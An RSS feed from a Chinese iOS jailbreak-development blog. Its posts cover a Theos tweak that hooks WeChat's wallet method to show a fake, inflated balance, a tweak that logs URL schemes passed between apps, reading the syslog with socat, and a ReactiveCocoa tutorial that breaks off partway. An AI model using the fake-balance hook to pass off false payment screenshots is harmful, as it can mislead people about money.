<?xml version="1.0" encoding="UTF-8"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
  <channel>
    <title>Yasin Blog</title>
    <description>不知道写些什么...</description>
    <link>http://localhost:4000/</link>
    <atom:link href="http://localhost:4000/feed.xml" rel="self" type="application/rss+xml" />
    <pubDate>Tue, 06 Jun 2017 09:17:03 +0000</pubDate>
    <lastBuildDate>Tue, 06 Jun 2017 09:17:03 +0000</lastBuildDate>
    <generator>Jekyll v3.3.1</generator>
    
      <item>
        <title>一行代码修改微信余额</title>
        <description>&lt;h3 id=&quot;flex的使用&quot;&gt;Flex的使用&lt;/h3&gt;

&lt;p&gt;以前一直用Flex来实现这个装逼功能，不过用Flex缺点非常的明显，它只能返回一个固定值，不会随着你的使用减少，正好最近在研究越狱开发，不如自己来写一个，顺便记录学习过程。
Flex这个插件的确很好用，你觉得哪个方法是控制你要修改的值，直接修改返回值试一试就能知道对不对。&lt;/p&gt;

&lt;p&gt;点这个加号添加一个新补丁
&lt;img src=&quot;http://localhost:4000/img/in-post/changewxmoney1.PNG&quot; alt=&quot;Application Support&quot; /&gt;&lt;/p&gt;

&lt;p&gt;title是设置补丁的名字，选下面的Add Units…
&lt;img src=&quot;http://localhost:4000/img/in-post/changewxmoney2.PNG&quot; alt=&quot;Application Support&quot; /&gt;&lt;/p&gt;

&lt;p&gt;选微信，下面是一些系统的库。
&lt;img src=&quot;http://localhost:4000/img/in-post/changewxmoney3.PNG&quot; alt=&quot;Application Support&quot; /&gt;&lt;/p&gt;

&lt;p&gt;到这一步就看到了微信的类，点进去能查看类的方法，到这里和class-dump功能差不多
&lt;img src=&quot;http://localhost:4000/img/in-post/changewxmoney4.PNG&quot; alt=&quot;Application Support&quot; /&gt;&lt;/p&gt;

&lt;h3 id=&quot;寻找目标方法&quot;&gt;寻找目标方法&lt;/h3&gt;

&lt;p&gt;现在可以开始动手找要Hook的方法了。开始果断先搜索一下&lt;code class=&quot;highlighter-rouge&quot;&gt;money&lt;/code&gt;关键字,应该是返回&lt;code class=&quot;highlighter-rouge&quot;&gt;double&lt;/code&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;long&lt;/code&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;int&lt;/code&gt;之类的吧。找了半天没找到，前面两个看着像随机红包的金额，不知道对不对，谁给我发个红包试一试呗。
&lt;img src=&quot;http://localhost:4000/img/in-post/changewxmoney5.PNG&quot; alt=&quot;Application Support&quot; /&gt;&lt;/p&gt;

&lt;p&gt;英语水平不够，翻译软件来凑。钱包，余额，各种关键字翻译了往搜索框里面丢，最后让我在&lt;code class=&quot;highlighter-rouge&quot;&gt;WCPayBalanceInfo&lt;/code&gt;里面发现有一个方法，这个方法返回了微信钱包里面显示的值。&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;-(long)m_uiAvailableBalance
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;点进去设置Return Value为99999，进钱包看一下，确实变了，不过少了2位，做过微信支付的都知道微信是以分为单位。
&lt;img src=&quot;http://localhost:4000/img/in-post/changewxmoney6.PNG&quot; alt=&quot;Application Support&quot; /&gt;&lt;/p&gt;

&lt;p&gt;虽然很容易就找到了，不过这样碰运气的寻找方式终究不是好的办法，是时候好好学习下汇编了。&lt;/p&gt;

&lt;h3 id=&quot;开始写插件&quot;&gt;开始写插件&lt;/h3&gt;

&lt;p&gt;既然要Hook的方法已经找到，接下来就简单了，老一套theos建工程，在xm文件里面写这些代码，数字你想改多少都行。&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;%hook WCPayBalanceInfo
-(long)m_uiAvailableBalance{
	return 6570000;
}
%end
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;make package install&lt;/code&gt;后进微信看看，有效果。只是钱的数值依然不能随着我们使用而改变。这里就需要用上&lt;code class=&quot;highlighter-rouge&quot;&gt;%orig&lt;/code&gt;。&lt;/p&gt;

&lt;p&gt;%orig会执行一遍原本的方法，有返回值也会返回回来，这样的话，上面的代码直接给成这样就OK了。这相当于给我们原本的余额加了一个基本值。&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;%hook WCPayBalanceInfo
-(long)m_uiAvailableBalance{
	return %orig+6570000;
}
%end
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;到这里我们的插件就基本能用了，不过不能控制插件的开启与关闭，也不能自定义这个基本值为多少。这就需要我们再进一步的优化一下了。&lt;/p&gt;

&lt;h3 id=&quot;增加开关及基本值自定义功能&quot;&gt;增加开关及基本值自定义功能&lt;/h3&gt;

&lt;p&gt;上一篇博客&lt;a href=&quot;https://yasintian.github.io/2017/06/01/UrlScheme%E6%9F%A5%E7%9C%8B/&quot;&gt;查看App之间的跳转协议&lt;/a&gt;里面我们用到了&lt;a href=&quot;https://github.com/DHowett/preferenceloader&quot;&gt;PreferenceLoader&lt;/a&gt;这个库，其实这个库的功能非常强大，提供了很多的控件来帮我们搭建我们的设置页面。
还和上次一样在根目录layout文件夹，里面加入对应的&lt;code class=&quot;highlighter-rouge&quot;&gt;plist&lt;/code&gt;文件和&lt;code class=&quot;highlighter-rouge&quot;&gt;icon&lt;/code&gt;，具体结构如下图。
&lt;img src=&quot;http://localhost:4000/img/in-post/changewxmoney7.png&quot; alt=&quot;最后是这个样子&quot; /&gt;&lt;/p&gt;

&lt;p&gt;不过这次的&lt;code class=&quot;highlighter-rouge&quot;&gt;Plist&lt;/code&gt;文件和上次就不太一样了，上次直接引入的Applist这个库。这次我们要自己搭建界面了。
&lt;img src=&quot;http://localhost:4000/img/in-post/changewxmoney8.png&quot; alt=&quot;Plist文件&quot; /&gt;&lt;/p&gt;

&lt;p&gt;这次的&lt;code class=&quot;highlighter-rouge&quot;&gt;Plist&lt;/code&gt;文件包含了三个模块。先看看&lt;code class=&quot;highlighter-rouge&quot;&gt;title&lt;/code&gt;和&lt;code class=&quot;highlighter-rouge&quot;&gt;entry&lt;/code&gt;这两个比较简单，是标题和设置界面里面cell的设置。&lt;/p&gt;

&lt;p&gt;比较复杂的是items这个数组里面，这个数组掌管了你的界面布局，preferenceloader这个插件真的是非常厉害，配置下Plist文件就能实现我们想要的功能。
&lt;img src=&quot;http://localhost:4000/img/in-post/changewxmoney9.png&quot; alt=&quot;Plist文件&quot; /&gt;&lt;/p&gt;

&lt;p&gt;看了这个图，相信你已经明白了个大概。每一个&lt;code class=&quot;highlighter-rouge&quot;&gt;item&lt;/code&gt;表示了一个控件。
&lt;img src=&quot;http://localhost:4000/img/in-post/changewxmoney10.PNG&quot; alt=&quot;效果图&quot; /&gt;&lt;/p&gt;

&lt;p&gt;和结果图对比可能会更清晰一点。
这里面真正有用的是&lt;code class=&quot;highlighter-rouge&quot;&gt;item1&lt;/code&gt;和&lt;code class=&quot;highlighter-rouge&quot;&gt;item2&lt;/code&gt;。&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;item1&lt;/code&gt;是开关&lt;code class=&quot;highlighter-rouge&quot;&gt;PSSwitchCell&lt;/code&gt;，更具名字能看出是一个拥有选择功能的cell。default是默认值，我们默认为NO。defaults和key是至关重要的两个值，&lt;code class=&quot;highlighter-rouge&quot;&gt;defaults&lt;/code&gt;会在&lt;code class=&quot;highlighter-rouge&quot;&gt;/var/mobile/Library/Preferences/com.yasin.ChangeWXMoney.plist&lt;/code&gt;生成对应的&lt;code class=&quot;highlighter-rouge&quot;&gt;Plist&lt;/code&gt;文件，而key表示这个空间和&lt;code class=&quot;highlighter-rouge&quot;&gt;Plist&lt;/code&gt;文件里面的哪个值绑定。&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;item2&lt;/code&gt;是一个带有输入框的Cell。&lt;code class=&quot;highlighter-rouge&quot;&gt;defaults&lt;/code&gt;和&lt;code class=&quot;highlighter-rouge&quot;&gt;key&lt;/code&gt;和上面的作用一样。isDecimalPad表示我需要用数字键盘。&lt;/p&gt;

&lt;p&gt;更多的cell你可以到这里查看
&lt;a href=&quot;http://iphonedevwiki.net/index.php/Preferences_specifier_plist&quot;&gt;http://iphonedevwiki.net/index.php/Preferences_specifier_plist&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;到这里开关和基本值输入框我们就配置好了，可以先运行看看界面有没有出现在设置里面。&lt;/p&gt;

&lt;h3 id=&quot;修改xm文件获取开关状态及基本值&quot;&gt;修改XM文件获取开关状态及基本值&lt;/h3&gt;
&lt;p&gt;前面说到设置&lt;code class=&quot;highlighter-rouge&quot;&gt;defaults&lt;/code&gt;会生成一个&lt;code class=&quot;highlighter-rouge&quot;&gt;Plist&lt;/code&gt;文件，我们先把这个文件的地址定义成宏。&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;#define PLIST_PATH @&quot;/var/mobile/Library/Preferences/com.yasin.ChangeWXMoney.plist&quot;
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;接着修改代码,加入了判断，如果开关是开启的状态就返回(原函数返回值+基本值)，否则就返回原函数的返回值。&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;%hook WCPayBalanceInfo
-(long)m_uiAvailableBalance{
    NSDictionary *dic = [NSDictionary dictionaryWithContentsOfFile:PLIST_PATH];
    if(dic&amp;amp;&amp;amp;dic[@&quot;MoneySwitch&quot;]){
        BOOL MoneySwitch = [dic[@&quot;MoneySwitch&quot;] boolValue];
        CGFloat money = [[[NSDictionary dictionaryWithContentsOfFile:PLIST_PATH] valueForKey:@&quot;money&quot;] floatValue];
        if(MoneySwitch){
            return %orig+100*money;
        }
    }
    return %orig;
}
%end
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;
&lt;p&gt;到这里修改微信余额的功能就弄完了，快编译运行去装逼吧。&lt;/p&gt;

</description>
        <pubDate>Thu, 01 Jun 2017 12:00:00 +0000</pubDate>
        <link>http://localhost:4000/2017/06/01/%E4%B8%80%E8%A1%8C%E4%BB%A3%E7%A0%81%E4%BF%AE%E6%94%B9%E5%BE%AE%E4%BF%A1%E4%BD%99%E9%A2%9D/</link>
        <guid isPermaLink="true">http://localhost:4000/2017/06/01/%E4%B8%80%E8%A1%8C%E4%BB%A3%E7%A0%81%E4%BF%AE%E6%94%B9%E5%BE%AE%E4%BF%A1%E4%BD%99%E9%A2%9D/</guid>
        
        <category>安全</category>
        
        
      </item>
    
      <item>
        <title>查看App之间的跳转协议</title>
        <description>&lt;p&gt;&lt;a href=&quot;https://github.com/yohunl/FlexInjected&quot;&gt;参考文章&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;一直想做一个App能跳转到我想去的App里面，网上找urlScheme也就是那么几个，而且大多数只能打开App不能分析进入里面的功能，索性我自己弄一个截获跳转协议的工具好了。在很久以前就已经搭建好了theos的环境，不过好久没动过了。&lt;/p&gt;

&lt;h3 id=&quot;创建工程&quot;&gt;创建工程&lt;/h3&gt;

&lt;p&gt;创建工程还是老步骤&lt;/p&gt;
&lt;ol&gt;
  &lt;li&gt;/opt/theos/bin/nic.pl&lt;/li&gt;
  &lt;li&gt;选择[11.] iphone/tweak&lt;/li&gt;
  &lt;li&gt;填你的工程名，包名，作者，要hook的bundleid这里我们填com.apple.UIKit这样能对所有的app生效&lt;/li&gt;
&lt;/ol&gt;

&lt;h3 id=&quot;hook函数&quot;&gt;Hook函数&lt;/h3&gt;

&lt;p&gt;ios下跳转到其他App主要是&lt;code class=&quot;highlighter-rouge&quot;&gt;UIApplication&lt;/code&gt;的这两个方法，先试一下能不能行&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;%hook UIApplication
-(BOOL)openURL:(NSURL*)url{
	UIAlertView * alert = [[UIAlertView alloc]initWithTitle:@&quot;Welcome&quot; message:url.absoluteString delegate:nil cancelButtonTitle:@&quot;Thanks&quot; otherButtonTitles:nil];
	[alert show];
	return %orig;
}

- (void)openURL:(NSURL*)url options:(NSDictionary&amp;lt;NSString *, id&amp;gt; *)options completionHandler:(id)completion{
	UIAlertView * alert = [[UIAlertView alloc]initWithTitle:@&quot;Welcome&quot; message:url.absoluteString delegate:nil cancelButtonTitle:@&quot;Thanks&quot; otherButtonTitles:nil];
	[alert show];
	%orig;
}

%end
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;分享文章到QQ试了试urlscheme就出来了。&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;http://localhost:4000/img/in-post/showsuccess.png&quot; alt=&quot;截屏分享到QQ&quot; /&gt;&lt;/p&gt;

&lt;h3 id=&quot;从接收端入手&quot;&gt;从接收端入手&lt;/h3&gt;

&lt;p&gt;前是从发送端入手，现在我们来看看接收端，从外部打开app主要是这几个方法，最后是个是ios9出的通用链接（Universal Links）进入的回调方法。全部都把url弹出来，在微信和QQ之间测试，发现QQ竟然换掉了系统的AlertView，当页面消失的时候就会收回弹框&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;%hook AppDelegate

- (BOOL)application:(UIApplication *)application openURL:(NSURL *)url sourceApplication:(NSString *)sourceApplication annotation:(id)annotation{
    UIAlertView * alert = [[UIAlertView alloc]initWithTitle:@&quot;Welcome&quot; message:url.absoluteString delegate:nil cancelButtonTitle:@&quot;Thanks&quot; otherButtonTitles:nil];
    [alert show];
    return %orig;
}

-(BOOL)application:(UIApplication *)app openURL:(NSURL *)url options:(NSDictionary&amp;lt;UIApplicationOpenURLOptionsKey,id&amp;gt; *)options{
    UIAlertView * alert = [[UIAlertView alloc]initWithTitle:@&quot;Welcome&quot; message:url.absoluteString delegate:nil cancelButtonTitle:@&quot;Thanks&quot; otherButtonTitles:nil];
    [alert show];
    return %orig;
}

-(BOOL)application:(UIApplication *)application handleOpenURL:(NSURL *)url{
    UIAlertView * alert = [[UIAlertView alloc]initWithTitle:@&quot;Welcome&quot; message:url.absoluteString delegate:nil cancelButtonTitle:@&quot;Thanks&quot; otherButtonTitles:nil];
    [alert show];
    return %orig;
}

-(BOOL)application:(UIApplication *)application continueUserActivity:(NSUserActivity *)userActivity restorationHandler:(void (^)(NSArray * _Nullable))restorationHandler{
    UIAlertView * alert = [[UIAlertView alloc]initWithTitle:@&quot;Welcome&quot; message:userActivity.webpageURL.absoluteString delegate:nil cancelButtonTitle:@&quot;Thanks&quot; otherButtonTitles:nil];
    [alert show];
    return %orig;
}

%end
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;代码写完了还是通过，&lt;code class=&quot;highlighter-rouge&quot;&gt;make&lt;/code&gt; &lt;code class=&quot;highlighter-rouge&quot;&gt;package&lt;/code&gt; &lt;code class=&quot;highlighter-rouge&quot;&gt;install&lt;/code&gt;&lt;/p&gt;

&lt;h3 id=&quot;对指定app启用&quot;&gt;对指定App启用&lt;/h3&gt;

&lt;p&gt;试了试可以看到app间的跳转协议了，但是这样很不方便，当我正常使用的时候很麻烦，每次都要点击关闭这个弹框，这里我们就需要做一个选择开启的功能。
在网上找了找可以把插件和App打包成deb安装，这样通过App来控制，不过很麻烦，都要自己来处理。&lt;/p&gt;

&lt;p&gt;后来在网上找到一篇教程https://github.com/yohunl/FlexInjected 里面讲到一个&lt;a href=&quot;https://github.com/DHowett/preferenceloader&quot;&gt;PreferenceLoader&lt;/a&gt;可以很方便的在系统设置里面给我们的插件添加一个开关，可以选择对哪些App启用插件。而且这个插件是很多越狱软件依赖插件，基本都装的有，我们只管用就行了。&lt;/p&gt;

&lt;p&gt;这个地方要新建一个tweak工程，通过新建的这个工程来控制。
&lt;a href=&quot;https://github.com/DHowett/preferenceloader&quot;&gt;PreferenceLoader&lt;/a&gt;的使用非常简单。只需要在工程根目录新建一个layout文件件，按照要求放入需要的文件就行了.&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;layout/Library/Application Support&lt;/code&gt;下面放上面生成的&lt;code class=&quot;highlighter-rouge&quot;&gt;dylib&lt;/code&gt;文件，这个文件&lt;code class=&quot;highlighter-rouge&quot;&gt;dylib&lt;/code&gt;在&lt;code class=&quot;highlighter-rouge&quot;&gt;.theos/_/Library/MobileSubstrate/DynamicLibraries&lt;/code&gt;里面，反正我是在这里弄得，其他地方好像也有，我就不去找了。&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;http://localhost:4000/img/in-post/dynamiclibraries.png&quot; alt=&quot;dylib文件在这里&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;layout/Library/PreferenceLoader/Preferences&lt;/code&gt;里面是关于设置界面的一些配置，一个&lt;code class=&quot;highlighter-rouge&quot;&gt;Plist&lt;/code&gt;文件和图标，图标就不说了。&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;Plist&lt;/code&gt;主要是这几个地方要改成你自己的，当然XM文件里面的地址也要对应的修改。
&lt;img src=&quot;http://localhost:4000/img/in-post/plist.png&quot; alt=&quot;Plist文件修改&quot; /&gt;&lt;/p&gt;

&lt;p&gt;最后弄完是这样的
&lt;img src=&quot;http://localhost:4000/img/in-post/F2D93245-2CBA-46B6-8FBB-12F4D7528906.png&quot; alt=&quot;Application Support&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;http://localhost:4000/img/in-post/preferences.png&quot; alt=&quot;PreferenceLoader&quot; /&gt;&lt;/p&gt;

&lt;p&gt;都弄好了就运行试试吧，出现插件不生效的情况可以用&lt;code class=&quot;highlighter-rouge&quot;&gt;socat&lt;/code&gt;看看打印的日志信息，看看到底有没有成功加载插件。还有什么问题可以看看我的&lt;a href=&quot;https://github.com/YasinTian/ShowOpenUrl&quot;&gt;demo&lt;/a&gt;。&lt;/p&gt;

</description>
        <pubDate>Thu, 01 Jun 2017 12:00:00 +0000</pubDate>
        <link>http://localhost:4000/2017/06/01/UrlScheme%E6%9F%A5%E7%9C%8B/</link>
        <guid isPermaLink="true">http://localhost:4000/2017/06/01/UrlScheme%E6%9F%A5%E7%9C%8B/</guid>
        
        <category>安全</category>
        
        
      </item>
    
      <item>
        <title>逆向开发%log的问题</title>
        <description>&lt;p&gt;&lt;a href=&quot;http://bbs.iosre.com/t/ios-socat/139&quot;&gt;参考文章&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;看了许多文章说%log会在/var/log/syslog日志里，但是我的ios9.3.3的系统怎么都没有发现这个文件。&lt;/p&gt;

&lt;p&gt;网上搜了一下。发现可以按照&lt;a href=&quot;https://www.theiphonewiki.com/wiki/System_Log&quot;&gt;https://www.theiphonewiki.com/wiki/System_Log&lt;/a&gt;里面的方法试一试。&lt;/p&gt;

&lt;p&gt;其中使用&lt;code class=&quot;highlighter-rouge&quot;&gt;socat&lt;/code&gt;的方法使用非常简单方便，推荐使用。&lt;/p&gt;

&lt;h3 id=&quot;socat&quot;&gt;socat&lt;/h3&gt;

&lt;p&gt;我是直接用Cydia安装的，搜索syslogd to /var/log/syslog这个安装就行了。
看别人的文章可以直接用命令安装&lt;code class=&quot;highlighter-rouge&quot;&gt;apt-get install socat&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;使用就比较简单了&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;socat - UNIX-CONNECT:/var/run/lockdown/syslog.sock
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;显示&lt;code class=&quot;highlighter-rouge&quot;&gt;ASL is here to serve you&lt;/code&gt;说明准备好了，这个时候输入&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;watch
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;屏幕上就会打印一大推东西出来。
我们只想看我们&lt;code class=&quot;highlighter-rouge&quot;&gt;Hook&lt;/code&gt;的程序只需要输入&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;*PID 要看的PID
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;还有其他用法可以输入&lt;code class=&quot;highlighter-rouge&quot;&gt;help&lt;/code&gt;看看其他命令。了解到这里，基本的调试就够用了。&lt;/p&gt;
</description>
        <pubDate>Mon, 06 Mar 2017 12:00:00 +0000</pubDate>
        <link>http://localhost:4000/2017/03/06/%E8%A7%A3%E5%86%B3-log%E6%89%93%E5%8D%B0%E6%97%A5%E5%BF%97%E4%B8%8D%E5%AD%98%E5%9C%A8%E9%97%AE%E9%A2%98/</link>
        <guid isPermaLink="true">http://localhost:4000/2017/03/06/%E8%A7%A3%E5%86%B3-log%E6%89%93%E5%8D%B0%E6%97%A5%E5%BF%97%E4%B8%8D%E5%AD%98%E5%9C%A8%E9%97%AE%E9%A2%98/</guid>
        
        <category>安全</category>
        
        
      </item>
    
      <item>
        <title>ReactiveCocoa快速入门</title>
        <description>&lt;p&gt;&lt;a href=&quot;https://github.com/ReactiveCocoa/ReactiveCocoa&quot;&gt;ReactiveCocoa地址&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;从RAC 5.0开始，RAC进行了巨大的变化，现在有了4个独立的库&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;https://github.com/ReactiveCocoa/ReactiveObjC&quot;&gt;ReactiveObjC&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;https://github.com/ReactiveCocoa/ReactiveSwift&quot;&gt;ReactiveSwift&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;https://github.com/ReactiveCocoa/ReactiveCocoa&quot;&gt;ReactiveCocoa&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;https://github.com/ReactiveCocoa/ReactiveObjCBridge&quot;&gt;ReactiveObjCBridge&lt;/a&gt;&lt;/p&gt;

&lt;h3 id=&quot;导入&quot;&gt;导入&lt;/h3&gt;

&lt;p&gt;用&lt;code class=&quot;highlighter-rouge&quot;&gt;cocoapods&lt;/code&gt;导入&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;    target 'ReactiveCocoa_Demo' do
      pod 'ReactiveCocoa'
    end
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;导入头文件&lt;code class=&quot;highlighter-rouge&quot;&gt;#import &amp;lt;ReactiveCocoa.h&amp;gt;&lt;/code&gt;&lt;/p&gt;

&lt;h3 id=&quot;基本使用&quot;&gt;基本使用&lt;/h3&gt;
&lt;p&gt;我们先试试&lt;code class=&quot;highlighter-rouge&quot;&gt;UIButton&lt;/code&gt;&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;    [[btn rac_signalForControlEvents:UIControlEventTouchUpInside] subscribeNext:^(id x) {
        NSLog(@&quot;ddd&quot;);
    }];
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;点击button会打印”ddd”说明，调用了block里面的内容。
看着可能有点复杂，但是不熟的时候可以拆开写&lt;/p&gt;

&lt;p&gt;先创建一个&lt;code class=&quot;highlighter-rouge&quot;&gt;RACSignal&lt;/code&gt;对象，再添加要执行的block。&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;    RACSignal *racSignal = [btn rac_signalForControlEvents:UIControlEventTouchUpInside];

    [racSignal subscribeNext:^(id x) {
        NSLog(@&quot;ddd&quot;);
    }];
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;RACSignal&lt;/code&gt;是RAC里面一个非常重要的概念，建议先掌握了&lt;code class=&quot;highlighter-rouge&quot;&gt;RACSignal&lt;/code&gt;的基本用法后在去了解他的原理。&lt;/p&gt;

&lt;p&gt;再来看看连续多个block的情况，比如已经创建了一个&lt;code class=&quot;highlighter-rouge&quot;&gt;UITextField&lt;/code&gt;叫&lt;code class=&quot;highlighter-rouge&quot;&gt;tf&lt;/code&gt;&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;    RACSignal *tfRac = [tf rac_textSignal];

    [[tfRac filter:^BOOL(NSNumber*length) {
        return YES;
    }] subscribeNext:^(id x) {
        NSLog(@&quot;%@&quot;, x);
    }];

&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;这样当UITextField里面内容变化的时候就会打印出UITextField的内容。&lt;/p&gt;

&lt;h3 id=&quot;filter&quot;&gt;filter&lt;/h3&gt;

&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;filter&lt;/code&gt;是一个过滤器里面能加一些判定条件用于判断是否继续往下面的执行。这样就表示当内容是123的时候才打印&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;    [[tfRac filter:^BOOL(id value) {
        if([value isEqualToString:@&quot;123&quot;]){//过滤出内容是123的情况
            return YES;
        }
        return NO;
    }] subscribeNext:^(id x) {
        NSLog(@&quot;%@&quot;,x);
    }];
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;h3 id=&quot;map&quot;&gt;map&lt;/h3&gt;

&lt;p&gt;还有一个常用的操作&lt;code class=&quot;highlighter-rouge&quot;&gt;map&lt;/code&gt;，在&lt;code class=&quot;highlighter-rouge&quot;&gt;map&lt;/code&gt;的&lt;code class=&quot;highlighter-rouge&quot;&gt;block&lt;/code&gt;里面可以更改要往下传的数据，比如下面的例子，textfield的内容被传入&lt;code class=&quot;highlighter-rouge&quot;&gt;map&lt;/code&gt;，在&lt;code class=&quot;highlighter-rouge&quot;&gt;block&lt;/code&gt;里面计算了文字长度之后，把文字长度传了下去。后面的block收到的参数就是这个长度值了。&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;    RACSignal *tfRac = [tf rac_textSignal];

    [[[tfRac
       map:^id(NSString*text){
           return @(text.length);//收到数据后转换成内容长度，再往后传
       }]
      filter:^BOOL(NSNumber*length){
          return[length integerValue] &amp;gt; 3;//过滤出长度大于3的
      }]
     subscribeNext:^(id x){
         NSLog(@&quot;%@&quot;, x);
     }];
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;h3 id=&quot;rac宏&quot;&gt;RAC宏&lt;/h3&gt;
&lt;p&gt;在ReactiveCocoa有一个&lt;code class=&quot;highlighter-rouge&quot;&gt;RAC&lt;/code&gt;宏非常好用,他可以直接把信号的输出应用到对象的属性上。参数1是要绑定的对象，参数2是要绑定的属性。下面的例子，当输入值为”123456”的时候背景颜色就会变成黄色了。&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;    tf.backgroundColor = [UIColor redColor];
    RACSignal *tfRac = [tf rac_textSignal];
    //tf的backgroundColor绑定信号
    RAC(tf,backgroundColor) = [tfRac map:^id(id value) {
        if([value isEqualToString:@&quot;123456&quot;]){
            //如果值为123456返回黄色
            return [UIColor yellowColor];
        }else{
            return [UIColor redColor];
        }
    }];
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;h3 id=&quot;信号聚合&quot;&gt;信号聚合&lt;/h3&gt;
&lt;p&gt;在用些时候需要聚合信号,&lt;code class=&quot;highlighter-rouge&quot;&gt;RACSignal&lt;/code&gt;提供了&lt;code class=&quot;highlighter-rouge&quot;&gt;combineLatest:reduce:&lt;/code&gt;这个方法可以把任意数量的信号聚合起来。&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;    //信号1
    RACSignal *tfRac = [tf rac_textSignal];
    [tfRac subscribeNext:^(id x) {
        NSLog(@&quot;%@&quot;,x);
    }];

    //信号2
    RACSignal *tf1Rac = [tf1 rac_textSignal];
    [tf1Rac subscribeNext:^(id x) {
        NSLog(@&quot;%@&quot;,x);
    }];

    //聚合信号
    [[RACSignal combineLatest:@[tfRac, tf1Rac]
                      reduce:^id(id x, id y){
                      //比较2个输入框的内容是否一样
                          if([x isEqualToString:y]){
                              NSLog(@&quot;一样&quot;);
                              return @1;
                          }else{
                              NSLog(@&quot;不一样&quot;);
                              return @0;
                          }
                      }] subscribeNext:^(id x) {
                          NSLog(@&quot;%@&quot;,x);
                      }];
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;h3 id=&quot;附加操作&quot;&gt;附加操作&lt;/h3&gt;
&lt;p&gt;有些时候我们可能需要在收到信号后进行一些附加操作，可以添加一个&lt;code class=&quot;highlighter-rouge&quot;&gt;doNext:&lt;/code&gt;block。&lt;/p&gt;

